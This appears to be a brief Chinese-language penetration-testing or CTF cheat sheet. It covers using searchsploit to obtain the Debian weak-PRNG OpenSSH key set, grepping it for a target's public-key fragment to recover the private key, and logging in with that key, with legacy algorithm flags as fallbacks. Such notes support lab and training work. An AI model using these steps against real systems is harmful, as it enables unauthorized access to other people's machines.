searchploit prng(寻找低版本Openssh的密钥对)

searchploit -m 文件名(下载下来)

cat 文件名看文件具体操作来使用

在指定的密钥对目录中使用
sudo grep -lr "公钥的一小部分"（查看对应公钥是否有私钥对)

sudo ssh -i 私钥 用户名@ip 先登录不行再加上参数

（-oHostKeyAlgorithms=ssh-rsa,ssh-dss -oPubKeyAcceptedKeyTypes=ssh-rsa,ssh-dss）

还不行使用 -vv查看具体的传输问题

如果端口改变了应该使用

正常登录
sudo ssh 用户名@ip
指定端口登录
sudo ssh 用户名@ip -p 指定端口
私钥登录
sudo ssh -i 私钥 用户名@ip
